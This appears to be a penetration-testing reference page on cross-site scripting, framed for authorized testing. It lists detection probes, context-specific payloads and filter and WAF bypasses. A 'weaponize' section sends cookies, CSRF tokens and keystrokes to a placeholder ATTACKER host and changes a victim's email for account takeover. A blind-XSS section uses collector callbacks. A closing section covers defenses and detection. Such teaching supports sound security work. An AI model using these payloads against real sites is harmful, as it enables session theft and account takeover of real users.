# Web — Cross-Site Scripting (XSS)

Running attacker-controlled JavaScript in another user's browser in the app's origin. Scope: authorized web testing only. Impact is **whatever the victim can do** — steal session cookies/tokens, perform actions as them (account takeover), keylog, pivot to internal apps. Getting a shell on the server is a different problem — see [RCE](RCE.md).

> Test in scope, against accounts you're allowed to use. A stored XSS that fires for real users/admins is high-impact — confirm the engagement allows it before planting a persistent payload.

## Contents

- [Types](#types)
- [Find it (detection)](#find-it-detection)
- [Context → payload](#context--payload)
- [Filter / WAF bypass](#filter--waf-bypass)
- [Weaponize (impact)](#weaponize-impact)
- [Blind XSS](#blind-xss)
- [Tooling](#tooling)
- [Defense / detection (for the report)](#defense--detection-for-the-report)

## Types

| Type | Where the payload lives | Note |
| --- | --- | --- |
| **Reflected** | In the request (URL param, header), echoed straight back | Needs a victim to click your link |
| **Stored** | Saved server-side (comment, profile, filename), served to others | Highest impact — fires for every viewer, incl. admins |
| **DOM-based** | Never touches the server; client-side JS writes `source` → `sink` | Look in JS, not the HTML response |
| **Blind** | Stored, but fires in a context you can't see (admin panel, logs) | Needs an out-of-band callback ([Blind XSS](#blind-xss)) |

DOM sources: `location`, `document.URL`, `referrer`, `postMessage`, `localStorage`. DOM sinks: `innerHTML`, `document.write`, `eval`, `setTimeout`, `.src`, jQuery `.html()`.

## Find it (detection)

```html
<!-- unique canary first, then grep the response for it un-encoded -->
'">< script >xss1234

<!-- classic probes once you know it reflects -->
<script>alert(document.domain)</script>
"><img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

**Why `document.domain` not `alert(1)`:** proves which origin executed it (matters with iframes/sandboxes) and is quieter in a report than `alert(1)`.

Workflow: inject the canary → view source → find where it lands → identify the **context** → pick a payload that breaks out of exactly that context.

```text
# reflected in HTML body, unencoded -> inject a tag directly
<p>Hello xss1234</p>                 -> <p>Hello <svg onload=alert(1)></p>
# reflected inside an attribute -> break out of the attribute first
value="xss1234"                      -> value=""><svg onload=alert(1)>
```

## Context → payload

```html
<!-- 1. HTML body: inject a tag -->
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>

<!-- 2. HTML attribute (value="HERE"): close the attribute/tag -->
"><svg onload=alert(1)>
"onmouseover="alert(1)          <!-- if you can't break the tag, add an event handler -->

<!-- 3. Inside <script> as a JS string ("HERE"): close the string -->
';alert(document.domain)//
</script><svg onload=alert(1)>  <!-- or break out of the script block entirely -->

<!-- 4. In a URL sink (href/src="HERE") -->
javascript:alert(document.domain)

<!-- 5. Inside a JS template / framework -->
{{constructor.constructor('alert(1)')()}}   <!-- AngularJS sandbox escape -->
```

## Filter / WAF bypass

```html
<!-- case / no-space / alternative tags & events -->
<ScRiPt>alert(1)</ScRiPt>
<img/src/onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>

<!-- when () is filtered -->
<svg onload=alert`1`>
<img src=x onerror="window['al'+'ert'](1)">

<!-- HTML-entity / encoding tricks -->
<a href="javas&#99;ript:alert(1)">x</a>
<img src=x onerror=&#97;lert(1)>

<!-- when "script"/"alert" keywords are stripped (non-recursive filter) -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- grab a fresh context-aware polyglot from PortSwigger's XSS cheat sheet when stuck -->
```

Tips: try every reflection point (params, JSON, headers like `Referer`/`User-Agent`, filenames), and both the raw and URL-decoded value. If one sink HTML-encodes `<>` but another doesn't, use the permissive one.

## Weaponize (impact)

```html
<!-- Steal the session cookie (only if NOT HttpOnly) -->
<svg onload="fetch('https://ATTACKER/c?'+document.cookie)">

<!-- Exfiltrate a CSRF token / page secret (works even with HttpOnly cookies) -->
<svg onload="fetch('/account').then(r=>r.text()).then(t=>fetch('https://ATTACKER/?'+encodeURIComponent(t)))">

<!-- Force a state-changing action as the victim (account takeover) -->
<svg onload="fetch('/account/email',{method:'POST',body:'email=attacker@evil.com',headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include'})">

<!-- Keylogger -->
<svg onload="document.onkeypress=e=>fetch('https://ATTACKER/k?'+e.key)">
```

- **HttpOnly cookie?** You can't read it, but you can still *use* the session from inside the page — perform the sensitive action directly (change email/password → takeover), or scrape the page/API for tokens and PII.
- **BeEF** hooks the browser for interactive post-exploitation (pivot, social-engineering popups) — heavy, lab/authorized use.
- Chain with [CSRF](CSRF.md): XSS defeats CSRF tokens because it reads them from the page.

## Blind XSS

Stored payload that fires somewhere you can't see (support/admin panel). Use an out-of-band collector:

```html
<script src="https://YOUR.xss.ht"></script>     <!-- XSS Hunter -->
<img src=x onerror="fetch('https://ATTACKER-COLLAB/'+document.domain)">
```

Plant it in fields an admin later views: name, user-agent, address, support ticket, filename. The callback (with URL, cookies, DOM) tells you it fired and where. Use Burp Collaborator / interactsh as the collector.

## Tooling

- **[Dalfox](https://github.com/hahwul/dalfox)** — fast automated XSS scanner/param-miner: `dalfox url "https://target/?q=1"`.
- **[XSStrike](https://github.com/s0md3v/XSStrike)** — context-aware payload generation + WAF fingerprinting.
- **Burp Suite** — manual repeater testing, the built-in XSS cheat sheet, and Collaborator for blind.
- **kxss / Gxss** — bulk-find reflected params that don't encode special chars.

```bash
dalfox url "https://target.tld/search?q=FUZZ"     # auto-detect context & verify
```

## Defense / detection (for the report)

- **Context-aware output encoding** on every sink (HTML, attribute, JS, URL) — the real fix; use the framework's auto-escaping and don't bypass it (`v-html`, `dangerouslySetInnerHTML`, `|safe`).
- **Content-Security-Policy** (no `unsafe-inline`, nonce/hash scripts) as defense-in-depth — turns many XSS into non-exec.
- **`HttpOnly`** + `Secure` + `SameSite` cookies so a payload can't read the session; short session lifetimes.
- **Validate/​sanitize rich HTML** server-side with an allowlist library (DOMPurify) — never regex-strip tags.
- **Avoid dangerous DOM sinks**; use `textContent`/`setAttribute` instead of `innerHTML`.
- **Detect:** WAF/log alerts on `<script`, `onerror=`, `javascript:` in params; CSP `report-uri` violations; outbound requests from user pages to unknown domains.

## Related

[Web Overview](Web%20Overview.md) · [CSRF](CSRF.md) (XSS defeats CSRF tokens) · [RCE](RCE.md)
